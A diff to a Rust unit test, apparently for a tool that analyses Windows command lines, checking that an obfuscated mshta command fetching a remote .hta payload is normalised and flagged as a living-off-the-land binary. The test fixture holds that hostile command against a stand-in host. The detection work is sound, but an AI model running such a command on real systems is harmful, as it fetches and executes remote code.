@@ -6431,11 +6431,9 @@ mod misc_handler_tests {
 
     #[test]
     fn mshta_liberal_url_emits_normalized_download() {
+        let raw = r#"mshta "hTtP:\\mshta-liberal.example\payload.hta""#;
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"mshta "hTtP:\\mshta-liberal.example\payload.hta""#,
-            &mut env,
-        );
+        interpret_line(raw, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(
                 t,
@@ -6444,6 +6442,13 @@ mod misc_handler_tests {
             )
         });
         assert!(has, "mshta URL not normalized: {:?}", env.traits);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "mshta" && cmd == raw)),
+            "mshta remote URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
     }
 
     #[test]
